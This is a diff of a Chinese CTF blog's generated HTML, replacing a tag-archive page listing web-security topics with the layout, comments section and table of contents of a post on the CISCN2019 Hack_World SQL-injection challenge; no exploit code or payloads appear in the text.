-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/php%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/"
-        >PHP解析特性</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/rce/"
-        >Rce</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/sql-%E4%BA%8C%E5%88%86%E6%B3%95/"
-        >SQL-二分法</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/"
-        >SQL注入</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"
-        >代码执行</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"
-        >原型链污染</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"
-        >变量覆盖</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
-        >文件上传</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/%E7%88%86%E7%A0%B4%E6%97%B6%E9%97%B4%E6%88%B3/"
-        >爆破时间戳</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/"
-        >网鼎杯</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/%E8%BD%AF%E8%BF%9E%E6%8E%A5/"
-        >软连接</a
-      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap article-nav-link-left"><img
+            data-src="/images/buu.png"
+            data-sizes="auto"
+            alt="网鼎杯 2018 Fakebook"
+            class="lazyload"
+          /><a href="/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">网鼎杯 2018 Fakebook</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="giscus">
+          <span>giscus</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment giscus-comment" data-aos="fade-up"
+     >
     </div></div>
-<div class="category-wrap"><div
-      class="archives-category-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-category-list-link" href="/categories/ctf-great/"
-        >ctf-great</a
-      >
-    </div><div
-      class="archives-category-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-category-list-link" href="/categories/learning/"
-        >Learning</a
-      >
-    </div><div
-      class="archives-category-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-category-list-link" href="/categories/writeup/"
-        >writeup</a
-      >
-    </div></div><section class="archives-wrap" data-aos="fade-up">
-    <div class="archive-year-wrap">
-      <a href="" class="archive-year">2025</a>
-    </div>
-    <ul><li class="archive-article">
-          <div class="archive-article-date-wrap">
-            <span>
-              <time
-                class="dt-published"
-                datetime="2025-07-01 14:25:19 &#43;0800 &#43;08"
-                itemprop="datePublished"
-                >2025-07</time
-              >
-            </span>
-          </div><a class="archive-article-title" href="/post/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world/"
-              >CISCN2019 华北赛区 Day2 Web1Hack_World</a
-            ></li><li class="archive-article">
-          <div class="archive-article-date-wrap">
-            <span>
-              <time
-                class="dt-published"
-                datetime="2025-07-01 14:19:27 &#43;0800 &#43;08"
-                itemprop="datePublished"
-                >2025-07</time
-              >
-            </span>
-          </div><a class="archive-article-title" href="/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook/"
-              >网鼎杯 2018 Fakebook</a
-            ></li><li class="archive-article">
-          <div class="archive-article-date-wrap">
-            <span>
-              <time
-                class="dt-published"
-                datetime="2025-06-20 23:37:00 &#43;0800 &#43;08"
-                itemprop="datePublished"
-                >2025-06</time
-              >
-            </span>
-          </div><a class="archive-article-title" href="/post/suctf-2019_easysql/"
-              >SUCTF 2019_EasySQL</a
-            ></li><li class="archive-article">
-          <div class="archive-article-date-wrap">
-            <span>
-              <time
-                class="dt-published"
-                datetime="2025-06-20 23:28:36 &#43;0800 &#43;08"
-                itemprop="datePublished"
-                >2025-06</time
-              >
-            </span>
-          </div><a class="archive-article-title" href="/post/roarctf-2019_easycalc/"
-              >RoarCTF 2019_EasyCalc</a
-            ></li></ul>
-  </section></div><nav id="page-nav" data-aos="fade-up"><span class="page-number current">1</span></nav>
-</section>
+</section></section>
         </div><footer id="footer">
   <div style="width: 100%; overflow: hidden">
     <div class="footer-line"></div>
@@ -742,7 +467,24 @@
             <div class="arrow-up"></div>
           </div><div id="mask" class="hide"></div>
       </div><nav id="mobile-nav">
-  <div class="sidebar-wrap"><div class="sidebar-author">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#exp">exp</a>
+      <ul>
+        <li><a href="#枚举法">枚举法</a></li>
+        <li><a href="#二分法">二分法</a></li>
+        <li><a href="#时间盲注">时间盲注</a></li>
+        <li><a href="#时间二分法">时间二分法</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
   <img
     data-src="/avatar/avatar.webp"
     data-sizes="auto"
@@ -817,7 +559,10 @@
       <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
       <div class="sidebar-menu-link">友链</div>
     </div></div>
-</div></nav>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
 </div><div class="site-search">
         <div class="reimu-popup popup">
           <div class="reimu-search">
@@ -879,10 +624,10 @@
   <div><script data-pjax>
         window.REIMU_POST = {
           author: "Lier",
-          title: "BUUCTF",
-          url: "https:\/\/www.lier.xin\/tags\/buuctf\/",
-          description: "",
-          cover: "https:\/\/www.lier.xin\/images\/1.png",
+          title: "CISCN2019 华北赛区 Day2 Web1Hack_World",
+          url: "https:\/\/www.lier.xin\/post\/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world\/",
+          description: "脚本",
+          cover: "https:\/\/www.lier.xin\/images\/buu.png",
         };
       </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
           if (_$$('.article-entry a.article-gallery-item').length > 0) {
@@ -1015,7 +760,7 @@
             envId: '',
             region: '',
             urls: [
-              'https\/\/www.lier.xin\/tags\/buuctf\/'
+              'https\/\/www.lier.xin\/post\/ciscn2019-%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba-day2-web1hack_world\/'
             ],
             includeReply: false
           }).then((res) => {
